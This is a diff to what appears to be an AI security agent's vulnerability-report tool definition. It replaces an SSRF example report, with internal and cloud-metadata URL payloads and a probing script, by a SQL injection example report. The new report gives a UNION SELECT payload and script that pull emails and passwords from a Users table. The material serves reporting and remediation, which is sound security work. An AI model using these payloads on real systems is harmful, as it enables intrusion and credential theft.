@@ -134,144 +134,29 @@ H = High (total loss of availability)</description>
 
     <examples>
 <function=create_vulnerability_report>
-<parameter=title>Server-Side Request Forgery (SSRF) via URL Preview Feature Enables Internal Network Access</parameter>
-<parameter=description>A server-side request forgery (SSRF) vulnerability was identified in the URL preview feature that generates rich previews for user-supplied links.
-
-The application performs server-side HTTP requests to retrieve metadata (title, description, thumbnails). Insufficient validation of the destination allows an attacker to coerce the server into making requests to internal network hosts and link-local addresses that are not directly reachable from the internet.
-
-This issue is particularly high risk in cloud-hosted environments where link-local metadata services may expose sensitive information (e.g., instance identifiers, temporary credentials) if reachable from the application runtime.</parameter>
-<parameter=impact>Successful exploitation may allow an attacker to:
-
-- Reach internal-only services (admin panels, service discovery endpoints, unauthenticated microservices)
-- Enumerate internal network topology based on timing and response differences
-- Access link-local services that should never be reachable from user input paths
-- Potentially retrieve sensitive configuration data and temporary credentials in certain hosting environments
-
-Business impact includes increased likelihood of lateral movement, data exposure from internal systems, and compromise of cloud resources if credentials are obtained.</parameter>
-<parameter=target>https://app.acme-corp.com</parameter>
-<parameter=technical_analysis>The vulnerable behavior occurs when the application accepts a user-controlled URL and fetches it server-side to generate a preview. The response body and/or selected metadata fields are then returned to the client.
-
-Observed security gaps:
-- No robust allowlist of approved outbound domains
-- No effective blocking of private, loopback, and link-local address ranges
-- Redirect handling can be leveraged to reach disallowed destinations if not revalidated after following redirects
-- DNS resolution and IP validation appear to occur without normalization safeguards, creating bypass risk (e.g., encoded IPs, mixed IPv6 notation, DNS rebinding scenarios)
-
-As a result, an attacker can supply a URL that resolves to an internal destination. The server performs the request from a privileged network position, and the attacker can infer results via returned preview content or measurable response differences.</parameter>
-<parameter=poc_description>To reproduce:
-
-1. Authenticate to the application as a standard user.
-2. Navigate to the link preview feature (e.g., “Add Link”, “Preview URL”, or equivalent UI).
-3. Submit a URL pointing to an internal resource. Example payloads:
-
-   - http://127.0.0.1:80/
-   - http://localhost:8080/
-   - http://10.0.0.1:80/
-   - http://169.254.169.254/ (link-local)
-
-4. Observe that the server attempts to fetch the destination and returns either:
-   - Preview content/metadata from the target, or
-   - Error/timing differences that confirm network reachability.
-
-Impact validation:
-- Use a controlled internal endpoint (or a benign endpoint that returns a distinct marker) to demonstrate that the request is performed by the server, not the client.
-- If the application follows redirects, validate whether an allowlisted URL can redirect to a disallowed destination, and whether the redirected-to destination is still fetched.</parameter>
-<parameter=poc_script_code>import json
-import sys
-import time
-from urllib.parse import urljoin
-
-import requests
-
-BASE = "https://app.acme-corp.com"
-PREVIEW_ENDPOINT = urljoin(BASE, "/api/v1/link-preview")
-
-SESSION_COOKIE = ""  # Set to your authenticated session cookie value if needed
-
-TARGETS = [
-    "http://127.0.0.1:80/",
-    "http://localhost:8080/",
-    "http://10.0.0.1:80/",
-    "http://169.254.169.254/",
-]
-
-
-def preview(url: str) -> tuple[int, float, str]:
-    headers = {
-        "Content-Type": "application/json",
-    }
-    cookies = {}
-    if SESSION_COOKIE:
-        cookies["session"] = SESSION_COOKIE
-
-    payload = {"url": url}
-    start = time.time()
-    resp = requests.post(PREVIEW_ENDPOINT, headers=headers, cookies=cookies, data=json.dumps(payload), timeout=15)
-    elapsed = time.time() - start
-
-    body = resp.text
-    snippet = body[:500]
-    return resp.status_code, elapsed, snippet
-
-
-def main() -> int:
-    print(f"Endpoint: {PREVIEW_ENDPOINT}")
-    print("Testing SSRF candidates (server-side fetch behavior):")
-    print()
-
-    for url in TARGETS:
-        try:
-            status, elapsed, snippet = preview(url)
-            print(f"URL: {url}")
-            print(f"Status: {status}")
-            print(f"Elapsed: {elapsed:.2f}s")
-            print("Body (first 500 chars):")
-            print(snippet)
-            print("-" * 60)
-        except requests.RequestException as e:
-            print(f"URL: {url}")
-            print(f"Request failed: {e}")
-            print("-" * 60)
-
-    return 0
-
-
-if __name__ == "__main__":
-    raise SystemExit(main())</parameter>
-<parameter=remediation_steps>Implement layered SSRF defenses:
-
-1. Explicit allowlist for outbound destinations
-   - Only permit fetching from a maintained set of approved domains (and required schemes).
-   - Reject all other destinations by default.
-
-2. Robust IP range blocking after DNS resolution
-   - Resolve the hostname and block private, loopback, link-local, and reserved ranges for both IPv4 and IPv6.
-   - Re-validate on every redirect hop; do not follow redirects to disallowed destinations.
-
-3. URL normalization and parser hardening
-   - Normalize and validate the URL using a strict parser.
-   - Reject ambiguous encodings and unusual notations that can bypass filters.
-
-4. Network egress controls (defense in depth)
-   - Enforce outbound firewall rules so the application runtime cannot reach sensitive internal ranges or link-local addresses.
-   - If previews are required, route outbound requests through a dedicated egress proxy with policy enforcement and auditing.
-
-5. Response handling hardening
-   - Avoid returning raw response bodies from previews.
-   - Strictly limit what metadata is returned and apply size/time limits to outbound fetches.
-
-6. Monitoring and alerting
-   - Log and alert on preview attempts to unusual destinations, repeated failures, high-frequency requests, or attempts to access blocked ranges.</parameter>
+<parameter=title>SQL Injection in /rest/products/search via q Parameter</parameter>
+<parameter=description>The search endpoint does not sanitize the q parameter, allowing SQL injection that exposes the entire database.</parameter>
+<parameter=impact>Full database access including user credentials, payment data, and admin accounts. Enables data exfiltration and potential RCE via stacked queries.</parameter>
+<parameter=target>http://target:3000</parameter>
+<parameter=technical_analysis>The q parameter is concatenated directly into a SQL query without parameterization. The application uses SQLite, which allows UNION-based extraction of arbitrary tables.</parameter>
+<parameter=poc_description>1. Send GET /rest/products/search?q=test%27))%20UNION%20SELECT%20sql,2,3,4,5,6,7,8,9%20FROM%20sqlite_master--
+2. Observe database schema in response.
+3. Extract users: GET /rest/products/search?q=test%27))%20UNION%20SELECT%20email,password,3,4,5,6,7,8,9%20FROM%20Users--</parameter>
+<parameter=poc_script_code>import requests
+r = requests.get("http://target:3000/rest/products/search",
+    params={"q": "test')) UNION SELECT email,password,3,4,5,6,7,8,9 FROM Users--"})
+print(r.json())</parameter>
+<parameter=remediation_steps>Use parameterized queries (prepared statements) for all database operations. Apply input validation and WAF rules for SQL metacharacters.</parameter>
 <parameter=attack_vector>N</parameter>
 <parameter=attack_complexity>L</parameter>
-<parameter=privileges_required>L</parameter>
+<parameter=privileges_required>N</parameter>
 <parameter=user_interaction>N</parameter>
-<parameter=scope>C</parameter>
+<parameter=scope>U</parameter>
 <parameter=confidentiality>H</parameter>
 <parameter=integrity>H</parameter>
-<parameter=availability>L</parameter>
-<parameter=endpoint>/api/v1/link-preview</parameter>
-<parameter=method>POST</parameter>
+<parameter=availability>N</parameter>
+<parameter=endpoint>/rest/products/search</parameter>
+<parameter=method>GET</parameter>
 </function>
     </examples>
   </tool>
